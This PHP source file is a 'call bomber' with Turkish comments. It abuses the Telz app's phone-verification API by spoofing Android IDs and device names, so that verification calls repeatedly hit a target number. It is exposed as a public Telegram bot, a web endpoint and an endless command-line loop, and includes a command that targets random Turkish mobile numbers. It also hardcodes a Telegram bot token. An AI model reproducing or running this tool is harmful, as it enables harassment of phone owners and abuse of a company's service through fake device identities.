<?php
/**
 * Ritalin Tool Call Bomber - 4.2 HATASI ÇÖZÜLDÜ
 * Gerçek Android ID ve cihaz bilgileri ile
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS');
define('GOKU', 300);
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);

// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');

// ==================== GERÇEK ANDROID ID'LER (Python'da çalışanlar) ====================
$VALID_ANDROID_IDS = [
    '13e50e93a6399e67',
    'adaf455b5e53cd24',
    'a3f8c91d2b4e6f78',
    '9c4d2e1a5b8f7g3h',
    '7f3e2d1c9b4a5f6e',
    'e8f7g6h5i4j3k2l1',
    'b5c6d7e8f9g0h1i2',
    'z9y8x7w6v5u4t3s2',
    'q1w2e3r4t5y6u7i8',
];

// ==================== GERÇEK CİHAZ İSİMLERİ ====================
$VALID_DEVICE_NAMES = [
    'Xiaomi 2311DRK48G',
    'Pixel 6',
    'Pixel 7',
    'Pixel 8',
    'Xiaomi 13',
    'Xiaomi 14',
    'Samsung S23',
    'Samsung S24',
    'OnePlus 11',
    'OnePlus 12',
    'Moto G84'
];

// ==================== GLOBAL DEĞİŞKENLER ====================
$GLOBALS['session_cookies'] = '';
$GLOBALS['uuid'] = null;

// ==================== RATE LIMIT (DEBOUNCE) ====================
$rate_limit_file = sys_get_temp_dir() . '/telz_ratelimit_' . md5($_SERVER['REMOTE_ADDR'] ?? 'local');

function can_call($phone) {
    $now = time();
    $data = @json_decode(@file_get_contents($rate_limit_file), true) ?: [];
    if (isset($data[$phone]) && ($now - $data[$phone]) < GOKU) {
        return false;
    }
    $data[$phone] = $now;
    file_put_contents($rate_limit_file, json_encode($data));
    return true;
}

// ==================== FONKSİYONLAR ====================

function randomAndroidId() {
    global $VALID_ANDROID_IDS;
    return $VALID_ANDROID_IDS[array_rand($VALID_ANDROID_IDS)];
}

function randomCihazAdi() {
    global $VALID_DEVICE_NAMES;
    return $VALID_DEVICE_NAMES[array_rand($VALID_DEVICE_NAMES)];
}

function generate_uuid() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function gonder($endpoint, $payload, $androidId = null, $timeout = 10.0) {
    global $uuid;
    
    if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
        $androidId = randomAndroidId();
    }
    
    if ($uuid === null) {
        $uuid = generate_uuid();
    }
    
    $payload['android_id'] = $androidId ?? '13e50e93a6399e67';
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip, deflate',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if (!empty($GLOBALS['session_cookies'])) {
        curl_setopt($ch, CURLOPT_COOKIE, $GLOBALS['session_cookies']);
    }
    curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) {
        if (strpos($header, 'Set-Cookie:') === 0) {
            $GLOBALS['session_cookies'] .= trim(substr($header, 12)) . '; ';
        }
        return strlen($header);
    });
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode === 429) {
        throw new Exception("Fazla deneme! Retry-After header'ını kontrol edin.");
    }
    if ($httpCode >= 400) {
        throw new Exception("HTTP Hata: $httpCode");
    }
    
    $decoded = json_decode($response, true);
    if ($decoded === null) {
        return $response;
    }
    return $decoded;
}

function kimlikListesi($androidId = null) {
    return gonder('app/auth_list', ['event' => 'auth_list'], $androidId);
}

function calistir($androidId = null, $deviceName = null, $ipv4 = '10.1.10.1', $ipv6 = 'FE80::1', $lang = 'tr') {
    if ($deviceName === null) {
        $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomCihazAdi() : 'Xiaomi 2311DRK48G';
    }
    return gonder('app/run', [
        'event' => 'run',
        'device_name' => $deviceName,
        'ipv4_address' => $ipv4,
        'ipv6_address' => $ipv6,
        'lang' => $lang,
        'network_country' => 'tr',
        'network_type' => '4G',
        'roaming' => 'no',
        'root' => 'no',
        'run_id' => '',
        'sim_country' => 'tr'
    ], $androidId);
}

function butonDurum($androidId = null, $btn = 'on_reg_continue') {
    return gonder('app/stat_btns', [
        'event' => 'stat_btns',
        'btn' => $btn
    ], $androidId);
}

function numaraDogrula($phone, $androidId = null, $region = 'TR') {
    return gonder('app/validate_phonenumber', [
        'event' => 'validate_phonenumber',
        'phone' => $phone,
        'region' => $region
    ], $androidId);
}

function aramaDogrula($phone, $androidId = null, $attempt = '0', $lang = 'tr') {
    if (MODE === 'DEBOUNCE' && !can_call($phone)) {
        throw new Exception("[!] Bu numaraya kısa süre önce arama atıldı. Lütfen " . GOKU . " saniye sonra tekrar deneyin!");
    }
    return gonder('app/auth_call', [
        'event' => 'auth_call',
        'phone' => $phone,
        'attempt' => $attempt,
        'lang' => $lang
    ], $androidId);
}

// ==================== TELEGRAM BOT MESAJ GÖNDER ====================
function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== TELEGRAM BOT İŞLEMLERİ (HERKESE AÇIK) ====================
function processTelegramCommand($chatId, $text) {
    $parts = explode(' ', trim($text), 2);
    $command = strtolower($parts[0]);
    $param = $parts[1] ?? '';
    
    switch ($command) {
        case '/start':
            sendTelegramMessage($chatId, "📞 <b> Call Bomber</b>\n\n"
                . "✅ Herkes kullanabilir!\n\n"
                . "Komutlar:\n"
                . "/call +905551234567 - Arama gönder\n"
                . "/random - Rastgele numara gönder\n"
                . "/status - Bot durumu");
            break;
            
        case '/call':
            if (empty($param)) {
                sendTelegramMessage($chatId, "❌ Numara girin: /call +905551234567");
                break;
            }
            $phone = trim($param);
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
            
            try {
                $androidId = randomAndroidId();
                $deviceName = randomCihazAdi();
                
                kimlikListesi($androidId);
                calistir($androidId, $deviceName);
                butonDurum($androidId);
                numaraDogrula($phone, $androidId);
                $result = aramaDogrula($phone, $androidId);
                
                $responseText = "📊 <b>API Yanıtı:</b>\n";
                $responseText .= "<pre>" . htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
                
                if (isset($result['status']) && $result['status'] === 'ok') {
                    sendTelegramMessage($chatId, "✅ Arama gönderildi: $phone\n\n" . $responseText);
                } else {
                    $reason = $result['reason'] ?? 'Bilinmeyen';
                    sendTelegramMessage($chatId, "❌ Hata: $reason\n\n" . $responseText);
                }
            } catch (Exception $e) {
                sendTelegramMessage($chatId, "❌ Hata: " . $e->getMessage());
            }
            break;
            
        case '/random':
            $operators = ['505', '506', '507', '530', '531', '532', '533', '534', '535', '536', '537', '538', '539', '540', '541', '542', '543', '544', '545', '546', '547', '548', '549', '550', '551', '552', '553', '554', '555', '556', '557', '558', '559', '560', '561', '562', '563', '564', '565', '566', '567', '568', '569'];
            $operator = $operators[array_rand($operators)];
            $randomPhone = '+90' . $operator . str_pad(mt_rand(0, 9999999), 7, '0', STR_PAD_LEFT);
            
            sendTelegramMessage($chatId, "📞 Rastgele: <code>$randomPhone</code>\n⏳ Gönderiliyor...");
            
            try {
                $androidId = randomAndroidId();
                $deviceName = randomCihazAdi();
                
                kimlikListesi($androidId);
                calistir($androidId, $deviceName);
                butonDurum($androidId);
                numaraDogrula($randomPhone, $androidId);
                $result = aramaDogrula($randomPhone, $androidId);
                
                $responseText = "📊 <b>API Yanıtı:</b>\n";
                $responseText .= "<pre>" . htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
                
                if (isset($result['status']) && $result['status'] === 'ok') {
                    sendTelegramMessage($chatId, "✅ Arama gönderildi: $randomPhone\n\n" . $responseText);
                } else {
                    $reason = $result['reason'] ?? 'Bilinmeyen';
                    sendTelegramMessage($chatId, "❌ Hata: $reason\n\n" . $responseText);
                }
            } catch (Exception $e) {
                sendTelegramMessage($chatId, "❌ Hata: " . $e->getMessage());
            }
            break;
            
        case '/status':
            sendTelegramMessage($chatId, "✅ Bot aktif (PUBLIC)\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s\n🔓 Herkes kullanabilir");
            break;
            
        default:
            sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start yazın.");
            break;
    }
}

// ==================== WEBHOOK ====================
if (php_sapi_name() !== 'cli') {
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        processTelegramCommand($chatId, $text);
        exit;
    }
    
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        $phone = trim($phone);
        $androidId = randomAndroidId();
        $deviceName = randomCihazAdi();
        
        $responseData = [
            'success' => false,
            'phone' => $phone,
            'steps' => []
        ];
        
        try {
            $result = kimlikListesi($androidId);
            $responseData['steps']['auth_list'] = $result;
            
            $result = calistir($androidId, $deviceName);
            $responseData['steps']['run'] = $result;
            
            $result = butonDurum($androidId);
            $responseData['steps']['stat_btns'] = $result;
            
            $result = numaraDogrula($phone, $androidId);
            $responseData['steps']['validate_phonenumber'] = $result;
            
            $result = aramaDogrula($phone, $androidId);
            $responseData['steps']['auth_call'] = $result;
            
            $responseData['success'] = isset($result['status']) && $result['status'] === 'ok';
            $responseData['final_status'] = $result['status'] ?? 'unknown';
            $responseData['reason'] = $result['reason'] ?? null;
            
        } catch (Exception $e) {
            $responseData['error'] = $e->getMessage();
        }
        
        header('Content-Type: application/json');
        echo json_encode($responseData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    echo json_encode(['status' => 'ok', 'message' => ' Call Bomber Aktif - PUBLIC']);
    exit;
}

// ==================== CLI BOT MODU ====================
if (php_sapi_name() === 'cli') {
    echo "\033[92m";
    echo "  ██████╗  █████╗ ██╗     ██╗\n";
    echo "  ██╔══██╗██╔══██╗██║     ██║\n";
    echo "  ██████╔╝███████║██║     ██║\n";
    echo "  ██╔══██╗██╔══██║██║     ██║\n";
    echo "  ██████╔╝██║  ██║███████╗███████╗\n";
    echo "  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝\n";
    echo "\033[0m";
    echo "\033[1;30;40m\t\t  Tool Call Bomber\n\033[0m";
    
    echo "\033[96mNumara gir (+90xx): \033[0m";
    $phone = trim(fgets(STDIN));
    $phone = trim($phone);
    
    if (MODE === 'TEST_RANDOM_IDS') {
        echo "Oh\n";
    }
    
    $runCount = 0;
    echo "\n🚀 Bot başlatılıyor... (Ctrl+C ile durdur)\n\n";
    
    while (true) {
        $runCount++;
        echo "\033[92m--- Döngü #$runCount ---\033[0m\n";
        
        try {
            $androidId = randomAndroidId();
            $deviceName = randomCihazAdi();
            
            echo "\033[90m🆔 Android ID: $androidId\033[0m\n";
            echo "\033[90m📱 Cihaz: $deviceName\033[0m\n";
            
            echo "\033[92m$phone:\033[0m ";
            $result = kimlikListesi($androidId);
            echo json_encode($result) . "\n";
            
            echo "\033[92m$phone:\033[0m ";
            $result = calistir($androidId, $deviceName);
            echo json_encode($result) . "\n";
            
            echo "\033[92m$phone:\033[0m ";
            $result = butonDurum($androidId);
            echo json_encode($result) . "\n";
            
            echo "\033[92m$phone:\033[0m ";
            $result = numaraDogrula($phone, $androidId);
            echo json_encode($result) . "\n";
            
            echo "\033[92m$phone:\033[0m ";
            $result = aramaDogrula($phone, $androidId);
            echo json_encode($result) . "\n";
            
            echo "\033[93m📊 API Yanıtı:\033[0m " . json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
            
            if (isset($result['status']) && $result['status'] === 'ok') {
                echo "\033[92m✓ ARAMA BAŞARIYLA GÖNDERİLDİ! ($phone)\033[0m\n";
            } else {
                $reason = $result['reason'] ?? 'Bilinmeyen';
                echo "\033[31m✗ Arama gönderilemedi. Hata: $reason\033[0m\n";
            }
            
            echo "\033[90m⏳ " . LOOP_INTERVAL . " saniye bekleniyor...\033[0m\n";
            sleep(LOOP_INTERVAL);
            
        } catch (Exception $e) {
            echo "\033[31mHata: " . $e->getMessage() . "\033[0m\n";
            sleep(5);
        }
    }
}